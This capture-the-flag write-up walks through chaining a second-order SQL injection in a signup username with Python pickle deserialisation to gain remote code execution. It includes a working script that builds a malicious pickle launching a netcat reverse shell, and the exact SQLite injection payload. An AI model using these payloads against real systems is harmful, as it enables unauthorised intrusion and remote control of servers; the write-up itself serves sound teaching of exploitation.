This was a relatively complex challenge, since it had two major vulnerabilities which had to be used together (as well as a couple of red herrings). The code was supplied and reading it was key to finding the vulnerabilities (solving this blind is basically not possible). 

# SQL Injection

The first line of code which should raise alarm bells is this one in `db.py`:

![](/Assets/Pasted%20image%2020241003185935.png)

Despite the "reassuring" comment, this line is vulnerable to SQL injection. 

Since all the other SQL queries are properly prepared, it is possible to insert a SQL injection payload into the username field when signing up for an account. This will not raise an error at registration time, but will trigger a SQL injection when a new post is added.

For example if you set your username to `abc' MY SQL PAYLOAD; --`, it would be inserted into the `User` field as is. The username session variable would then be set to that when you logged in. This variable is then passed into `insert_post` when a new post is created, resulting in the query

`INSERT INTO Post (Username, Post) VALUES ('abc' MY SQL PAYLOAD; --', ?)`

The register page on the site does not accept `'` characters in the username field, but this is only checked client-side, and can be trivially bypassed using BurpSuite, or by sending a POST request directly with cURL.

It may not be immediately obvious how this can be exploited to do anything useful, but with a bit more reading, you should spot another dubious element.

# Insecure Deserialisation

Taking a look inside `post.py` to see what's actually stored in the database, will show you that posts are Python objects which are pickled when stored.

![](/Assets/Pasted%20image%2020241003191345.png)

Pickle is very unsafe, and is capable of executing arbitrary code when loading a crafted pickle object.
[This](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) blog post explains the vulnerability and how to exploit it very well, but in essence if you pickle an object with the `__reduce__` method defined, when it is deserialised this method will be invoked, allowing for arbitrary code execution.

This requires control over data which will be passed to `pickle.loads`, which we can get using the aforementioned SQL injection. 

# Building an Exploit

We know that we can inject SQL into the query which is used to insert new pickle serialized posts into the database, and that if we can control pickle data which is loaded by `get_posts` we can get arbitrary code execution. It looks like we have a clear path forward that leads directly to RCE.

Since we control the entire `INSERT` query after the username, we control the `Post` field which will be inserted (which contains the raw pickle data that will be loaded by `get_posts`). A slightly poorly documented SQLite feature is that literal BLOBs (raw bytes) can be represented with the syntax `X'<hex data>'`. 

As such, we can first off construct a malicious pickle object which will run a command (in this case a netcat reverse shell) using a python script like so:

```python
import os
import pickle

MY_IP = "127.0.0.1" # change this to your IP
MY_PORT = 4444 # change this if you want

COMMAND = f"rm /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/sh | nc {MY_IP} {MY_PORT} > /tmp/p"

class EvilPost:
	def __init__(self, cmd: str):
		self.cmd = cmd
	def __reduce__(self):
		return (os.system, (self.cmd,))

payload = pickle.dumps(EvilPost(COMMAND))
print(f"X'{payload.hex().upper()}'")
```

This will print our malicious serialized pickle data in SQLite BLOB format.

To inject this into the database, we would intuitively need a payload like `evilhacker', X'<pickle data>'); --`, as this would cause the query executed when creating a new post to look like 

`INSERT INTO Post (Username, Post) VALUES ('evilhacker', X'<pickle data>'); --', ?)`

However, this payload will not work, since SQLite expects there to be a `?` parameter in the query, which we have now commented out. A good way around this issue is to use the `COALESCE` SQL function. This function is effectively a null-coalescing operator which will return its first argument if it is not NULL, and its second argument otherwise. 

By using the COALESCE operator like `COALESCE(X'<pickle data>', ?)` we cause it to always return our malicious pickle data, while still allowing SQLite to substitute the parameter into the query. This makes our payload

`evilhacker', COALESCE(X'<pickle data>', ?)); --`

leading to the query

`INSERT INTO Post (Username, Post) VALUES ('evilhacker', COALESCE(X'<pickle data>', ?)); --', ?)`

# Triggering the Exploit

First of all, setup a netcat listener on the port you specified when creating the pickle payload.

Finally, to trigger the exploit, we can register an account with the above payload as our username (and whatever we want as the password). Then, we can create a new post containing whatever we want (since this data will never actually be added to the database). Then we need to log out, and register another account as `evilhacker` (again with any password). Logging into this account and viewing the posts will trigger the pickle payload to be deserialised and executed, and if all has gone well, we should get a shell.

![](/Assets/Pasted%20image%2020241003200328.png)

![](/Assets/Pasted%20image%2020241003200403.png)

![](/Assets/Pasted%20image%2020241003200450.png)

![](/Assets/Pasted%20image%2020241003200503.png)

![](/Assets/Pasted%20image%2020241003200533.png)

![](/Assets/Pasted%20image%2020241003200707.png)
